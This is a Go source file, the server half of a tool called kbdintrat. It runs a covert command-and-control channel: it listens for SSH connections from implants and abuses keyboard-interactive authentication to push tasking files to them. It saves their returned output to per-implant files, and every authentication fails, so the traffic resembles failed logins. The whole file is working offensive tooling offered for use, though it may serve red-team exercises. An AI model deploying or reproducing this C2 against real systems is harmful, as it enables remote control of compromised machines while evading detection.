package main

/*
 * server.go
 * Server side of kbdintrat
 * By J. Stuart McMurray
 * Created 20190825
 * Last Modified 20190825
 */

import (
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

const (
	/* outFilePerm is the file permissions on the output file */
	outFilePerm = 0600
	/* outDirPerm is the file permissions on the output directory */
	outDirPerm = 0700
)

var (
	// ErrWorked is returned when tasking works nicely
	ErrWorked = errors.New("worked")

	/* tlock locks the tasking directory */
	tlock sync.Mutex
)

// DoServer listens for SSH clients and tasks them if tasking exists
func DoServer(
	version string,
	keyFile string,
	addr string,
	timeout time.Duration,
	taskingDir string,
	outputDir string,
) {
	/* Get the server hostkey */
	key, err := getHostKey(keyFile)
	if nil != err {
		log.Fatalf("Error reading key from %s: %v", keyFile, err)
	}

	/* Make the server config */
	conf := &ssh.ServerConfig{
		KeyboardInteractiveCallback: func(
			conn ssh.ConnMetadata,
			client ssh.KeyboardInteractiveChallenge,
		) (*ssh.Permissions, error) {
			return handleClientAuth(
				conn,
				client,
				taskingDir,
				outputDir,
			)
		},
		ServerVersion: version,
	}
	conf.AddHostKey(key)

	/* Listen for clients */
	l, err := net.Listen("tcp", addr)
	if nil != err {
		log.Fatalf("Unable to listen for clients on %v: %v", addr, err)
	}
	log.Printf(
		"Listening for SSH clients on %v with fingerprint %v",
		l.Addr(),
		ssh.FingerprintSHA256(key.PublicKey()),
	)

	/* Handle clients */
	for {
		/* Get a client */
		c, err := l.Accept()
		if nil != err {
			log.Fatalf("Error accepting new clients: %v", err)
			/* TODO: Check for too many clients */
		}
		/* Upgrade to SSH and wait for tasking to finish */
		go handleClientConn(c, conf, timeout)
	}
}

/* handleClientConn tries to upgrade c to SSH. */
func handleClientConn(
	c net.Conn,
	conf *ssh.ServerConfig,
	timeout time.Duration,
) {
	defer c.Close()

	/* Upgrade to SSH (i.e. task the implant) */
	ch := make(chan error)
	go func() {
		_, _, _, err := ssh.NewServerConn(c, conf)
		ch <- err
	}()

	/* Wait for the output or a timeout */
	var err error
	select {
	case err = <-ch:
	case <-time.After(timeout):
		err = ErrTimeout
	}

	/* Tell the user what happened */
	if ErrTimeout == err {
		log.Printf("[%v] Timeout", c.RemoteAddr())
		return
	}

	/* Banner grabs are common */
	if io.EOF == err {
		log.Printf("[%v] Bannergrab", c.RemoteAddr())
		return
	}

	/* Make sure we have the sort of error we expect */
	e, ok := err.(*ssh.ServerAuthError)
	if !ok { /* Unexpected error type */
		log.Printf("[%v] Unexpected error %v", c.RemoteAddr(), err)
		return
	}

	/* Print the errors we got back */
	for _, err := range e.Errors {
		switch err {
		case ErrWorked: /* What we want */
			return
		case ssh.ErrNoAuth: /* Unfortunately normal */
		default:
			log.Printf(
				"[%v] Auth error: %v",
				c.RemoteAddr(),
				err,
			)
		}
	}
}

/* getHostKey tries to read an SSH private key from the file named fn */
func getHostKey(fn string) (ssh.Signer, error) {
	/* Read the key from the file */
	bs, err := ioutil.ReadFile(fn)
	if nil != err {
		return nil, err
	}
	/* Parse it */
	return ssh.ParsePrivateKey(bs)
}

/* handleClientAuth abuses keyboard-interactive auth to send tasking and get
output. */
func handleClientAuth(
	conn ssh.ConnMetadata,
	client ssh.KeyboardInteractiveChallenge,
	taskingDir string,
	outputDir string,
) (*ssh.Permissions, error) {
	/* Username will be the filename for the tasking.  It should only have
	allowed characters. */
	fn := conn.User()
	if "" != strings.Trim(fn, IDOK) {
		return nil, fmt.Errorf("invalid id %q", fn)
	}

	/* Make sure the output file exists */
	f, err := openOutputFile(outputDir, fn)
	if nil != f {
		f.Close()
	}
	if nil != err {
		return nil, err
	}

	/* Update the last seen time on the file */
	now := time.Now()
	if err := os.Chtimes(
		filepath.Join(outputDir, fn),
		now,
		now,
	); nil != err {
		log.Printf("[%v] Unable to update file times: %v", fn, err)
	}

	/* See if we have tasking */
	p := filepath.Join(taskingDir, fn)
	tlock.Lock()
	t, rerr := ioutil.ReadFile(p)
	uerr := os.Remove(p)
	tlock.Unlock()
	if nil != rerr {
		if os.IsNotExist(rerr) {
			return nil, ErrWorked
		}
		return nil, rerr
	}
	if 0 == len(t) { /* Empty file */
		return nil, ErrWorked
	}
	if nil != uerr {
		log.Printf("Unable to remove tasking file %v: %v", p, uerr)
	}

	/* Send tasking and get response */
	as, err := client(fn, "", []string{string(t)}, []bool{true})
	if nil != err {
		return nil, err
	}
	if 0 == len(as) {
		return nil, fmt.Errorf("got no output from ID %s", fn)
	}
	if 1 != len(as) {
		return nil, fmt.Errorf(
			"got %v outputs (expecting 1) from ID %v",
			len(as),
			fn,
		)
	}

	/* Write the output to a file */
	if err := os.MkdirAll(outputDir, outDirPerm); nil != err {
		return nil, err
	}
	of, err := openOutputFile(outputDir, fn)
	if nil != err {
		return nil, err
	}
	defer of.Close()
	n, err := io.WriteString(of, as[0])
	if nil != err {
		return nil, err
	}
	log.Printf(
		"[%v] Sent %v bytes of tasking and got %v bytes of output",
		fn,
		len(t),
		n,
	)

	return nil, ErrWorked
}

/* openOutputFile opens the output file for the id */
func openOutputFile(outputDir, id string) (*os.File, error) {
	return os.OpenFile(
		filepath.Join(outputDir, id),
		os.O_CREATE|os.O_APPEND|os.O_WRONLY,
		outFilePerm,
	)
}
